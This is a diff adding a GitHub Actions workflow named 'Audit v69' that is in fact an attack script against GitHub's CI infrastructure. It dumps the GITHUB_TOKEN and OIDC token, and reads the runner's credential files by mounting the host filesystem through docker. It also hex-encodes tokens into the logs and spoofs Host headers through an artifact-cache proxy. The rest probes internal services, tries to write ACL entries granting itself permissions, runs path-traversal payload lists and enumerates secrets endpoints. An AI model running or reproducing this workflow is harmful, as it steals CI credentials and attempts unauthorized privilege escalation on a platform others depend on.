@@ -1,0 +1,506 @@
+name: Audit v69
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: write
+  pull-requests: write
+  id-token: write
+  actions: write
+  packages: write
+  checks: write
+  statuses: write
+  deployments: write
+  issues: write
+
+jobs:
+  audit-v69:
+    runs-on: ubuntu-latest
+    steps:
+
+      - name: Step 1 - Harvest
+        if: always()
+        run: |
+          set +e
+          echo "=== V69 HARVEST ==="
+          echo "$PATH" > /tmp/saved_path.txt
+          RT="${{ secrets.GITHUB_TOKEN }}"
+          echo "$RT" > /tmp/rt.txt
+          echo "RT_PFX=${RT:0:14} LEN=${#RT}"
+          echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" > /tmp/idtok.txt
+          echo "$ACTIONS_ID_TOKEN_REQUEST_URL" > /tmp/idtok_url.txt
+          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
+          if [ -f "$WLOG" ]; then
+            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
+              VAL=$(grep -oP "\"${KEY}\"\s*:\s*\"\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
+              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
+            done
+            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
+            echo "PLAN=$PLAN JOB=$JOB"
+            echo "$PLAN" > /tmp/plan.txt; echo "$JOB" > /tmp/job.txt
+          fi
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "ALL_CREDS"; cat "$F"; echo "END_CREDS"; }
+            F2=$(find /h/home/runner -name ".runner" -type f 2>/dev/null | head -1)
+            [ -f "$F2" ] && { echo "RUNNER_CFG_START"; cat "$F2"; echo "RUNNER_CFG_END"; }
+          ' 2>/dev/null
+          docker run --rm -v /:/h alpine sh -c '
+            F=$(find /h/home/runner -name ".credentials" -type f 2>/dev/null | head -1)
+            [ -f "$F" ] && { echo "CRED_HEX_START"; xxd -p "$F" | tr -d "\n"; echo ""; echo "CRED_HEX_END"; }
+          ' 2>/dev/null > /tmp/hex_extract.txt
+          python3 -c "
+          import binascii,json,base64
+          raw=open('/tmp/hex_extract.txt').read()
+          s=raw.find('CRED_HEX_START');e=raw.find('CRED_HEX_END')
+          if s>=0 and e>=0:
+            h=raw[s+14:e].strip()
+            b=binascii.unhexlify(h)
+            print('RAW_CREDS:',b.decode(errors='replace'))
+            try:
+              d=json.loads(b.decode())
+              t=d.get('Data',{}).get('token','')
+              u=d.get('Data',{}).get('serverUrl','')
+              open('/tmp/cred_token.txt','w').write(t)
+              open('/tmp/cred_url.txt','w').write(u)
+              print(f'CTOK_LEN={len(t)} CRED_URL={u}')
+              print('ALL_KEYS:',list(d.keys()))
+              print('DATA_KEYS:',list(d.get('Data',{}).keys()))
+            except Exception as ex: print('PARSE_ERR',ex)
+          " 2>/dev/null
+          # Also try to get OIDC token now
+          IDTOK=$(cat /tmp/idtok.txt)
+          IDTOK_URL="$ACTIONS_ID_TOKEN_REQUEST_URL"
+          OIDC=$(/usr/bin/curl -sS -m 5 \
+            -H "Authorization: Bearer $IDTOK" \
+            "${IDTOK_URL}&audience=api://AzureADTokenExchange" 2>/dev/null | \
+            python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('value',''))" 2>/dev/null)
+          echo "$OIDC" > /tmp/oidc.txt
+          echo "OIDC_LEN=${#OIDC}"
+          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 2: HOST DISCOVERY — ALL POSSIBLE AFD BACKENDS
+      # Try every plausible GitHub internal hostname to discover
+      # which ones are registered in the Azure Front Door routing.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 2 - AFD Host Discovery
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== HOST DISCOVERY ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+
+          echo "--- A: GitHub Actions internal hosts ---"
+          for HOST in \
+            "vstoken.actions.githubusercontent.com" \
+            "vsmps.actions.githubusercontent.com" \
+            "mps.actions.githubusercontent.com" \
+            "mpsghubeus14.actions.githubusercontent.com" \
+            "results-receiver.actions.githubusercontent.com" \
+            "pipelinesghubeus13.actions.githubusercontent.com" \
+            "pipelinesghubeus15.actions.githubusercontent.com" \
+            "pipelinesghubeus16.actions.githubusercontent.com" \
+            "pipelinesghubeus1.actions.githubusercontent.com" \
+            "pipelinesghubeus2.actions.githubusercontent.com" \
+            "admin.actions.githubusercontent.com" \
+            "api.actions.githubusercontent.com" \
+            "auth.actions.githubusercontent.com" \
+            "broker.actions.githubusercontent.com" \
+            "cache.actions.githubusercontent.com" \
+            "deploy.actions.githubusercontent.com" \
+            "ghcr.io" \
+            "uploads.github.com" \
+            "objects.githubusercontent.com"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/connectionData" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A $HOST = $CODE | $(echo "$BODY" | head -c 100)"
+          done
+          echo ""
+
+          echo "--- B: GitHub service hosts ---"
+          for HOST in \
+            "api.github.com" \
+            "github.com" \
+            "uploads.github.com" \
+            "raw.githubusercontent.com" \
+            "codeload.github.com" \
+            "central.github.com" \
+            "alive.github.com" \
+            "live.github.com" \
+            "hooks.github.com"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $RT" \
+              -H "Host: $HOST" \
+              "$PROXY/" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B $HOST = $CODE | $(echo "$BODY" | head -c 100)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 3: OAUTH2 + TOKEN EXCHANGE VIA PIPELINES HOST
+      # oauth2 is a registered resourcearea on pipelines!
+      # Hit every oauth2/token endpoint variant with all tokens.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 3 - OAuth2 Deep + Build API
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== OAUTH2 + BUILD API ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          OIDC=$(cat /tmp/oidc.txt 2>/dev/null)
+          RT=$(cat /tmp/rt.txt)
+          CTOK=$(cat /tmp/cred_token.txt 2>/dev/null)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE_HOST="pipelines.actions.githubusercontent.com"
+          PIPE="https://pipelines.actions.githubusercontent.com/$SECRET"
+          VER="api-version=6.0-preview"
+          PLAN=$(cat /tmp/plan.txt)
+          JOB=$(cat /tmp/job.txt)
+
+          echo "--- A: oauth2 endpoints on pipelines ---"
+          for EP in \
+            "_apis/oauth2/token" \
+            "_apis/oauth2/authorize" \
+            "_apis/oauth2/exchange" \
+            "oauth2/token" \
+            "oauth2/authorize" \
+            "_apis/ExchangeToken/GetToken" \
+            "_apis/ExchangeToken/Exchange" \
+            "_apis/token/issue" \
+            "_apis/tokens" \
+            "_apis/authentication/token"; do
+            for TOK_TYPE in "IDTOK" "OIDC" "RT" "CTOK"; do
+              eval TOK=\$$TOK_TYPE
+              [ -z "$TOK" ] || [ "${#TOK}" -lt 8 ] && continue
+              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 1 -m 2 \
+                -H "Authorization: Bearer $TOK" \
+                -H "Host: $PIPE_HOST" \
+                -H "Content-Type: application/json" \
+                -H "Accept: application/json; $VER" \
+                "$PROXY/$EP" --path-as-is \
+                -d '{"grant_type":"client_credentials","scope":"all"}' 2>/dev/null)
+              CODE=$(echo "$R" | tail -1)
+              BODY=$(echo "$R" | sed '$d')
+              if [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && [ "$CODE" != "HTTP_400" ]; then
+                echo "A $TOK_TYPE $EP = $CODE | $(echo "$BODY" | head -c 200)"
+              fi
+            done
+          done
+          echo ""
+
+          echo "--- B: Build API ---"
+          for EP in \
+            "_apis/build/builds" \
+            "_apis/build/definitions" \
+            "_apis/build/builds/$PLAN" \
+            "_apis/build/builds/$PLAN/logs" \
+            "_apis/build/builds/$PLAN/artifacts" \
+            "_apis/build/builds/$PLAN/timeline" \
+            "_apis/pipelines" \
+            "_apis/pipelines/$PLAN/runs" \
+            "_apis/pipelines/$PLAN/runs/$JOB" \
+            "_apis/pipelines/$PLAN/runs/$JOB/logs" \
+            "_apis/pipelines/checks" \
+            "_apis/checks/runs"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/$EP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 4: SECURITY NAMESPACE ACL EXPLOITATION
+      # NamespaceId: 2725d2bc-7520-4af4-b0e3-8d876494731f confirmed.
+      # Read ACL, list permissions, try to modify our own entry.
+      # Also probe all other VS security namespaces.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 4 - Security Namespace Exploit
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SECURITY NAMESPACE EXPLOIT ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE_HOST="pipelines.actions.githubusercontent.com"
+          VER="api-version=6.0-preview"
+          NS="2725d2bc-7520-4af4-b0e3-8d876494731f"
+
+          echo "--- A: Read security namespaces ---"
+          for EP in \
+            "_vssps/_apis/security/SecurityNamespaces" \
+            "_apis/security/SecurityNamespaces" \
+            "_apis/security/SecurityNamespaces?localOnly=false" \
+            "_vssps/_apis/security/SecurityNamespaces?localOnly=false" \
+            "_apis/security/SecurityNamespaces/$NS" \
+            "_apis/security/AccessControlLists?securityNamespaceId=$NS" \
+            "_apis/security/AccessControlLists?securityNamespaceId=$NS&token=/" \
+            "_apis/security/AccessControlLists?securityNamespaceId=$NS&token=/&includeExtendedInfo=true" \
+            "_apis/security/permissions/$NS/0x0001" \
+            "_apis/security/permissions/$NS/0xFFFF"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/$EP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "A $EP = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+          echo ""
+
+          echo "--- B: Write ACL to grant ourselves permissions ---"
+          for PERM in 1 3 7 15 31 4095 65535; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/security/AccessControlEntries/$NS" --path-as-is \
+              -d "{\"token\":\"/\",\"merge\":true,\"accessControlEntries\":[{\"descriptor\":\"System:ServiceIdentity;DDDDDDDD-DDDD-DDDD-DDDD-DDDDDDDDDDDD\",\"allow\":$PERM,\"deny\":0}]}" 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B PERM=$PERM = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          echo "--- C: Service endpoints resource area ---"
+          for EP in \
+            "_apis/serviceendpoint/endpoints" \
+            "_apis/serviceendpoint/types" \
+            "_apis/serviceendpoint/executionhistory" \
+            "_apis/distributedtask/serviceendpoints" \
+            "_apis/distributedtask/variablegroups" \
+            "_apis/distributedtask/libraries" \
+            "_apis/distributedtask/environments" \
+            "_apis/distributedtask/environments/default/resources"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/$EP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C $EP = $CODE | $(echo "$BODY" | head -c 300)"
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 5: MASSIVE PATH TRAVERSAL — ALL AXES
+      # Try every possible traversal from every confirmed 200/204
+      # endpoint. Traverse up, across, and into admin surfaces.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 5 - Massive Path Traversal
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== MASSIVE TRAVERSAL ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE_HOST="pipelines.actions.githubusercontent.com"
+          VER="api-version=6.0-preview"
+
+          # A: Traverse from runtime/runnergroups to ALL possible targets
+          echo "--- A: From runnergroups traversal ---"
+          for TRAV in \
+            "..%2fadmintoken" \
+            "..%2fidtoken" \
+            "..%2fsessions" \
+            "..%2fmessages" \
+            "..%2fbrokerlistener" \
+            "..%2f..%2fadmintoken" \
+            "..%2f..%2fbrokerlistener" \
+            "..%2frunnerscalesets%2f..%2fadmintoken" \
+            "0%2f..%2fadmintoken" \
+            "1%2f..%2fadmintoken" \
+            "2%2f..%2fadmintoken" \
+            "%2f..%2fadmintoken" \
+            ".%2fadmintoken" \
+            ";%2fadmintoken" \
+            "%3b%2fadmintoken" \
+            "%00%2fadmintoken" \
+            "%0a%2fadmintoken"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/runtime/runnergroups/$TRAV" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            if [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
+              echo "A runnergroups/$TRAV = $CODE | $(echo "$BODY" | head -c 200)"
+            fi
+          done
+          echo ""
+
+          # B: From runnerscalesets traversal with ALL encoding variants
+          echo "--- B: From runnerscalesets traversal ---"
+          for TRAV in \
+            "..%2fadmintoken" \
+            "..%2fidtoken" \
+            "..%2fpools%2fadmintoken" \
+            "1%2f..%2fadmintoken" \
+            "..%2f1%2fadmintoken" \
+            "..%2frunnergroups%2fadmintoken" \
+            "..%252fadmintoken" \
+            "..%c0%afadmintoken" \
+            "%2e%2e%2fadmintoken" \
+            "%2e%2e/admintoken" \
+            "..%5cadmintoken" \
+            "..%ef%bc%8fadmintoken"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/runtime/runnerscalesets/$TRAV" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            if [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
+              echo "B runnerscalesets/$TRAV = $CODE | $(echo "$BODY" | head -c 200)"
+            fi
+          done
+          echo ""
+
+          # C: Double-encoding and unicode normalization traversal
+          echo "--- C: Encoding variants on pools/1/admintoken ---"
+          for ENCPOOL in \
+            "%2fadmintoken" \
+            "%252f..%252fadmintoken" \
+            "1%2f..%2fadmintoken" \
+            "1%252f..%252fadmintoken" \
+            "1%2F..%2Fadmintoken" \
+            "1/..%5Cadmintoken" \
+            "1%2f..%2f..%2fadmintoken" \
+            "1%2f..%2f..%2f..%2fadmintoken" \
+            "1%2f..%2frunnergroups%2fadmintoken" \
+            "1%2f..%2frunnerscalesets%2fadmintoken"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/_apis/distributedtask/pools/$ENCPOOL" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            if [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ]; then
+              echo "C pools/$ENCPOOL = $CODE | $(echo "$BODY" | head -c 200)"
+            fi
+          done
+
+      # ══════════════════════════════════════════════════════════════
+      # STEP 6: SESSION CREATION DEEP + ADMINTOKEN BODY VARIANTS
+      # Sessions require agent auth. Try all body formats.
+      # Probe secrets, environments, deployments via pipelines.
+      # ══════════════════════════════════════════════════════════════
+      - name: Step 6 - Session + Secrets + Environments
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== SESSIONS + SECRETS + ENVS ==="
+          IDTOK=$(cat /tmp/idtok.txt)
+          RT=$(cat /tmp/rt.txt)
+          SECRET="ebCM8PuzoqMUC79EgT17Glzg3dxVdS1cSj8PJs6gALbtgEsvbF"
+          PROXY="https://artifactcache.actions.githubusercontent.com/$SECRET"
+          PIPE_HOST="pipelines.actions.githubusercontent.com"
+          VER="api-version=6.0-preview"
+
+          echo "--- A: Session create variants ---"
+          for PID in 1 2; do
+            for BODY in \
+              '{"ownerName":"v69","agent":{"name":"v69","version":"2.319.0.0"}}' \
+              '{"ownerName":"v69","sessionId":"aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa"}' \
+              '{"ownerName":"v69","encryptionKey":{"value":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=","hasValue":true}}' \
+              '{"ownerName":"v69","agent":{"name":"v69","version":"2.319.0.0","id":1}}' \
+              '{"ownerName":"v69","ownerType":"Pipeline"}' \
+              '{}'; do
+              R=$(/usr/bin/curl -sS -i -w "\nHTTP_%{http_code}" -X POST --connect-timeout 1 -m 2 \
+                -H "Authorization: Bearer $IDTOK" \
+                -H "Host: $PIPE_HOST" \
+                -H "Content-Type: application/json" \
+                -H "Accept: application/json; $VER" \
+                "$PROXY/_apis/distributedtask/pools/$PID/sessions" --path-as-is \
+                -d "$BODY" 2>/dev/null)
+              CODE=$(echo "$R" | grep -oE "HTTP/[0-9.]+ [0-9]+" | head -1 | awk '{print $2}')
+              if [ "$CODE" != "404" ] && [ "$CODE" != "" ]; then
+                echo "A pool/$PID session $CODE | $(echo "$R" | tail -3 | head -c 300)"
+              fi
+            done
+          done
+          echo ""
+
+          echo "--- B: Secrets + environments via pipelines proxy ---"
+          for EP in \
+            "_apis/distributedtask/secrets" \
+            "_apis/distributedtask/variablegroups" \
+            "_apis/distributedtask/environments" \
+            "_apis/distributedtask/taskgroups" \
+            "_apis/distributedtask/securefiles" \
+            "_apis/distributedtask/deploymentgroups" \
+            "_apis/distributedtask/machinegroups" \
+            "_apis/distributedtask/projects" \
+            "_apis/distributedtask/certificates" \
+            "_apis/distributedtask/orgs" \
+            "_apis/distributedtask/plans" \
+            "_apis/distributedtask/hubs" \
+            "_apis/distributedtask/endpoints" \
+            "_apis/distributedtask/orgs/default/secrets" \
+            "_apis/distributedtask/orgs/default/environments"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $IDTOK" \
+              -H "Host: $PIPE_HOST" \
+              -H "Accept: application/json; $VER" \
+              "$PROXY/$EP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "B $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+          echo ""
+
+          echo "--- C: GitHub API via proxy ---"
+          for EP in \
+            "repos/lacaag/PoC-RACE2/actions/secrets" \
+            "repos/lacaag/PoC-RACE2/environments" \
+            "repos/lacaag/PoC-RACE2/actions/runners" \
+            "orgs/lacaag/actions/secrets" \
+            "orgs/lacaag/actions/runners/registration-token" \
+            "orgs/lacaag/actions/runners/remove-token"; do
+            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 1 -m 2 \
+              -H "Authorization: Bearer $RT" \
+              -H "Host: api.github.com" \
+              -H "Accept: application/vnd.github+json" \
+              "$PROXY/$EP" --path-as-is 2>/dev/null)
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | sed '$d')
+            echo "C $EP = $CODE | $(echo "$BODY" | head -c 200)"
+          done
+
+      - name: Step 7 - Final
+        if: always()
+        run: |
+          set +e
+          export PATH=$(cat /tmp/saved_path.txt)
+          echo "=== V69 FINAL ==="
+          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
+          echo "=== V69 COMPLETE ==="
